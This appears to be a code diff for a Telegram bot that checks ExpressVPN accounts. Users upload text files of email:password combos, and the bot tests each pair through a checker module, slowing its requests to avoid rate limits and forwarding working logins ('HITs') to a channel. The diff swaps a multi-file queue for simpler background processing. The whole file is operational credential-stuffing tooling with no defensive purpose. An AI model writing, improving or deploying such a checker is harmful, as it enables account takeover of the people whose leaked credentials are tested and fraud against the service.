@@ -1,20 +1,11 @@
-// api/telegram.js – ExpressVPN Bot with file queue system
+// api/telegram.js – ExpressVPN Bot (simple, like 10 Minute School)
 import { checkExpressVPN } from '../lib/expressChecker.js';
 import { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } from '../lib/config.js';
 
-// ===== In-memory file queue per chat =====
-// প্রতিটি chatId-এর জন্য একটি queue থাকবে
-const chatQueues = new Map(); // chatId -> { active: bool, files: [], current: null }
-
-function getQueue(chatId) {
-  if (!chatQueues.has(chatId)) {
-    chatQueues.set(chatId, { active: false, files: [], current: null });
-  }
-  return chatQueues.get(chatId);
-}
-
 export default async function handler(req, res) {
-  if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
+  if (req.method !== 'POST') {
+    return res.status(405).json({ error: 'Method not allowed' });
+  }
 
   const body = req.body;
   if (!body.message) return res.status(200).json({ ok: true });
@@ -25,167 +16,92 @@ export default async function handler(req, res) {
 
   // ===== /start =====
   if (text === '/start') {
-    await sendMessage(chatId, 
+    await sendMessage(chatId,
       "🤖 *ExpressVPN Checker Bot*\n\n" +
-      "Send me one or more `.txt` files with combos:\n" +
+      "Send a `.txt` file with combos:\n" +
       "`email:password` (one per line)\n\n" +
-      "I'll process them *one by one* and forward HITs to the channel.\n\n" +
-      "Commands:\n" +
-      "/status — Show queue status\n" +
-      "/cancel — Cancel all pending files"
+      "I'll check them one by one and forward HITs to the channel."
     );
-    return res.status(200).json({ ok: true });
-  }
-
-  // ===== /status =====
-  if (text === '/status') {
-    const q = getQueue(chatId);
-    let msg = `📊 *Queue Status*\n\n`;
-    if (q.current) {
-      msg += `🔁 *Currently processing:* ${q.current.fileName}\n`;
-      msg += `📂 *Files in queue:* ${q.files.length}\n`;
-    } else {
-      msg += `📭 No file currently processing.\n`;
-      msg += `📂 *Files in queue:* ${q.files.length}\n`;
-    }
-    if (q.files.length > 0) {
-      msg += `\n*Pending files:*\n`;
-      q.files.forEach((f, i) => { msg += `${i + 1}. ${f.fileName}\n`; });
-    }
-    await sendMessage(chatId, msg);
-    return res.status(200).json({ ok: true });
-  }
-
-  // ===== /cancel =====
-  if (text === '/cancel') {
-    const q = getQueue(chatId);
-    q.files = [];
-    await sendMessage(chatId, "🗑️ All pending files cancelled.");
     return res.status(200).json({ ok: true });
   }
 
   // ===== File upload =====
   if (document && document.mime_type === 'text/plain') {
-    const q = getQueue(chatId);
-    const fileInfo = {
-      fileId: document.file_id,
-      fileName: document.file_name || 'combos.txt'
-    };
-    q.files.push(fileInfo);
-
-    const position = q.files.length;
-    await sendMessage(chatId, `📥 *${fileInfo.fileName}* added to queue (position: ${position}).`);
-
-    // যদি কিছু চলছে না, শুরু করো
-    if (!q.active) {
-      processQueue(chatId);
-    }
-
-    return res.status(200).json({ ok: true });
-  }
-
-  return res.status(200).json({ ok: true });
-}
-
-// ===== Queue Processor =====
-async function processQueue(chatId) {
-  const q = getQueue(chatId);
-  if (q.active) return;              // already processing
-  if (q.files.length === 0) {        // nothing left
-    q.active = false;
-    q.current = null;
-    return;
-  }
-
-  q.active = true;
-  const fileInfo = q.files.shift();
-  q.current = fileInfo;
-
-  try {
-    await sendMessage(chatId, `🚀 *Starting:* ${fileInfo.fileName}\n(${q.files.length} file(s) still queued)`);
-
-    // 1. ডাউনলোড ফাইল
-    const fileUrl = await getFileUrl(fileInfo.fileId);
+    // 1. ফাইল ডাউনলোড
+    const fileUrl = await getFileUrl(document.file_id);
     if (!fileUrl) {
-      await sendMessage(chatId, `❌ Failed to get file: ${fileInfo.fileName}`);
-      q.active = false;
-      q.current = null;
-      return processQueue(chatId); // পরের ফাইলে যাও
+      await sendMessage(chatId, "❌ Failed to get file.");
+      return res.status(200).json({ ok: false });
     }
 
     const fileContent = await downloadFile(fileUrl);
     if (!fileContent) {
-      await sendMessage(chatId, `❌ Failed to download: ${fileInfo.fileName}`);
-      q.active = false;
-      q.current = null;
-      return processQueue(chatId);
+      await sendMessage(chatId, "❌ Failed to download file.");
+      return res.status(200).json({ ok: false });
     }
 
     // 2. কম্বো পার্স
     const lines = fileContent.split(/\r?\n/);
     const combos = [];
     for (const line of lines) {
-      const t = line.trim();
-      if (!t) continue;
-      const idx = t.indexOf(':');
+      const trimmed = line.trim();
+      if (!trimmed) continue;
+      const idx = trimmed.indexOf(':');
       if (idx === -1) continue;
-      const u = t.slice(0, idx).trim();
-      const p = t.slice(idx + 1).trim();
-      if (u && p) combos.push({ username: u, password: p });
+      const user = trimmed.slice(0, idx).trim();
+      const pass = trimmed.slice(idx + 1).trim();
+      if (user && pass) combos.push({ username: user, password: pass });
     }
 
     if (combos.length === 0) {
-      await sendMessage(chatId, `⚠️ No valid combos in ${fileInfo.fileName}`);
-      q.active = false;
-      q.current = null;
-      return processQueue(chatId);
+      await sendMessage(chatId, "❌ No valid combos found (format: email:password)");
+      return res.status(200).json({ ok: false });
     }
 
-    await sendMessage(chatId, `📊 *${fileInfo.fileName}*: ${combos.length} combos. Checking...`);
+    // 3. টেলিগ্রামকে তাৎক্ষণিক রেসপন্স (টাইমআউট এড়াতে)
+    res.status(200).json({ ok: true });
 
-    // 3. চেকিং (সিরিয়াল)
-    let hits = 0;
-    const startTime = Date.now();
-
-    for (let i = 0; i < combos.length; i++) {
-      const combo = combos[i];
-      const result = await checkExpressVPN(combo.username, combo.password);
-
-      if (result.hit) {
-        hits++;
-        await forwardToChannel(result);
-      }
-
-      // প্রতি ১০টি বা শেষে প্রগ্রেস
-      if ((i + 1) % 10 === 0 || i + 1 === combos.length) {
-        await sendMessage(chatId, `📊 *${fileInfo.fileName}*\nProgress: ${i + 1}/${combos.length} | HITs: ${hits}`);
-      }
-
-      // রেট লিমিট এড়াতে ছোট বিরতি
-      await new Promise(r => setTimeout(r, 400));
-    }
-
-    const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
-    await sendMessage(chatId, 
-      `✅ *Done:* ${fileInfo.fileName}\n` +
-      `Total: ${combos.length} | 🔥 HITs: ${hits}\n` +
-      `⏱️ Time: ${elapsed}s`
-    );
-
-  } catch (err) {
-    await sendMessage(chatId, `❌ Error processing ${fileInfo.fileName}: ${err.message}`);
+    // 4. ব্যাকগ্রাউন্ডে প্রসেসিং
+    setTimeout(() => processCombos(chatId, combos), 100);
+    return;
   }
 
-  q.active = false;
-  q.current = null;
-
-  // পরের ফাইল প্রসেস করো
-  if (q.files.length > 0) {
-    setTimeout(() => processQueue(chatId), 500);
-  }
+  return res.status(200).json({ ok: true });
 }
 
-// ===== Helper: Send message =====
+// ===== প্রসেসিং (সিরিয়াল, 300ms ডিলে) =====
+async function processCombos(chatId, combos) {
+  const total = combos.length;
+  let hits = 0;
+  const startTime = Date.now();
+
+  await sendMessage(chatId, `📥 Received ${total} combos. Checking one by one...`);
+
+  for (let i = 0; i < combos.length; i++) {
+    const combo = combos[i];
+    const result = await checkExpressVPN(combo.username, combo.password);
+
+    if (result.hit) {
+      hits++;
+      await forwardToChannel(result);
+    }
+
+    // প্রতি ৫টি বা শেষে প্রগ্রেস
+    if ((i + 1) % 5 === 0 || i + 1 === total) {
+      await sendMessage(chatId, `⏳ Progress: ${i + 1}/${total} | HITs: ${hits}`);
+    }
+
+    // 300ms ডিলে (10MS-এর মতো)
+    await new Promise(r => setTimeout(r, 300));
+  }
+
+  const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
+  let summary = `✅ *Checking complete!*\nTotal: ${total}\n🔥 HITS: ${hits}\n⏱️ Time: ${elapsed}s`;
+
+  await sendMessage(chatId, summary);
+}
+
+// ===== হেল্পার ফাংশন =====
 async function sendMessage(chatId, text) {
   const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
   try {
@@ -201,7 +117,6 @@ async function sendMessage(chatId, text) {
   } catch (e) {}
 }
 
-// ===== Helper: Get file URL =====
 async function getFileUrl(fileId) {
   const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getFile?file_id=${fileId}`;
   try {
@@ -214,7 +129,6 @@ async function getFileUrl(fileId) {
   return null;
 }
 
-// ===== Helper: Download file =====
 async function downloadFile(fileUrl) {
   try {
     const res = await fetch(fileUrl);
@@ -224,7 +138,6 @@ async function downloadFile(fileUrl) {
   }
 }
 
-// ===== Helper: Forward HIT to channel =====
 async function forwardToChannel(result) {
   if (!TELEGRAM_CHAT_ID) return;
   const message = `🎯 *ExpressVPN HIT*\n\n` +
